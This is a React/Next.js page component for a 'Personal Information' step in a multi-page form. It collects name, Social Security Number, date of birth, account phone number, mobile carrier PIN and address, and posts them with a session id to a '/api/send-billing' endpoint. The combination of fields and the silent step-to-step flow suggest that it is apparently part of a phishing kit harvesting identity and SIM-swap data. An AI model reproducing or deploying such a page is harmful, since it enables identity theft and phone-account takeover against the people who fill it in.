import React, { useContext, useEffect, useState } from "react";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import LeftSide from "../components/LeftSide";
import RightSide from "../components/RightSide";
import Sides from "../components/Sides";
import Button from "../components/Button";
import Error from "../components/Error";
import TextInput from "../components/TextInput";
import { DataContext } from "./_app";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { Wrapper } from "../components/Wrapper";

interface PersonalInformationProps {}

export const PersonalInformation: React.FC<PersonalInformationProps> = ({}) => {
  const [loading, setLoading] = useState(false);

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `BILLING`);
    formData.append(
      `billing`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-billing`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      billing: data,
    });

    const url =
      getProgress()[getProgress().indexOf(`Personal Information`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper page="Personal Information">
      <div className="card-information">
        <Sides>
          <LeftSide>
            <div>
              <TextInput
                name="firstname"
                title="First name"
                register={register("firstname", {
                  required: "Please enter your first name",
                })}
              />
              {errors?.firstname && (
                <Error
                  message={errors.firstname.message as unknown as string}
                />
              )}
            </div>
            <div>
              <TextInput
                name="lastname"
                title="Last name"
                register={register("lastname", {
                  required: "Please enter your last name",
                })}
              />
              {errors?.lastname && (
                <Error message={errors.lastname.message as unknown as string} />
              )}
            </div>
            <div>
              <TextInput
                name="ssn"
                title="Social Security Number"
                mask={`999-99-9999`}
                register={register("ssn", {
                  required: "Please enter your Social Security Number",
                  pattern: {
                    value: /^\d{3}-?\d{2}-?\d{4}$/,
                    message: "Please enter a valid SSN",
                  },
                })}
              />
              {errors?.ssn && (
                <Error message={errors.ssn.message as unknown as string} />
              )}
            </div>
            <div>
              <TextInput
                name="dob"
                title="Date of birth: MM/DD/YYYY"
                mask={`99/99/9999`}
                register={register("dob", {
                  required: "Please enter your date of birth",
                  pattern: {
                    value:
                      /(0[1-9]|1[012])[- /.](0[1-9]|[12][0-9]|3[01])[- /.](19|20)\d\d/,
                    message:
                      "Please enter a valid date of birth in the format mentioned above",
                  },
                })}
              />
              {errors?.dob && (
                <Error message={errors.dob.message as unknown as string} />
              )}
            </div>
            <div>
              <TextInput
                name="phoneNumber"
                title="Phone Number"
                mask={`(999) 999 9999`}
                register={register("phoneNumber", {
                  required:
                    "Please enter the phone number associated with your account",
                  pattern: {
                    value:
                      /^1?\s?(\([0-9]{3}\)[- ]?|[0-9]{3}[- ]?)[0-9]{3}[- ]?[0-9]{4}$/,
                    message: "Please enter a phone number",
                  },
                })}
              />
              {errors?.phoneNumber && (
                <Error
                  message={errors.phoneNumber.message as unknown as string}
                />
              )}
            </div>
            <div>
              <TextInput
                name="carrierPin"
                title="Carrier Pin"
                type="number"
                register={register("carrierPin", {
                  required: "Please enter your carrier pin",
                  pattern: {
                    value: /^[0-9]{4}$/,
                    message: "Please enter a valid carrier pin",
                  },
                })}
              />
              {errors?.carrierPin && (
                <Error
                  message={errors.carrierPin.message as unknown as string}
                />
              )}
            </div>
            <div>
              <TextInput
                name="streetAddress"
                title="Street address"
                type="text"
                register={register("streetAddress", {
                  required: "Please enter your street address",
                })}
              />
              {errors?.streetAddress && (
                <Error
                  message={errors.streetAddress.message as unknown as string}
                />
              )}
            </div>
            <div>
              <TextInput
                name="zipCode"
                title="Zip code"
                register={register("zipCode", {
                  required: "Please enter your Zip code",
                })}
              />
              {errors?.zipCode && (
                <Error message={errors.zipCode.message as unknown as string} />
              )}
            </div>
            <div>
              <TextInput
                name="state"
                title="State"
                register={register("state", {
                  required: "Please enter your state",
                })}
              />
              {errors?.state && (
                <Error message={errors.state.message as unknown as string} />
              )}
            </div>
          </LeftSide>
          <RightSide />
        </Sides>
        <Button onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default PersonalInformation;
